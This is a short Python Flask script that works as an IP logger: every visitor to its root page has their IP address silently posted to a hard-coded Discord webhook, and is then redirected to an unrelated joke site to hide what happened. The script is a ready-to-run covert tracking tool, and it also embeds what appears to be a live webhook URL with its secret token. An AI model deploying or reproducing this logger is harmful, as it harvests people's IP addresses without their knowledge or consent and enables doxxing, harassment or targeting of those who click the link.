from flask import Flask, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1376119689129889812/RPSuEOVlaIu7BXd0W6eXDqPlOumgCT3DLFiFwl-AfmGGwq6xD7hAMDHUIoI3mVlKT26t'

@app.route('/')
def capture_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    requests.post(WEBHOOK_URL, json={"content": f"Visitor IP: {ip}"})
    return redirect("https://bigrat.monster")  # Optional redirect

app.run(host='0.0.0.0', port=8080)
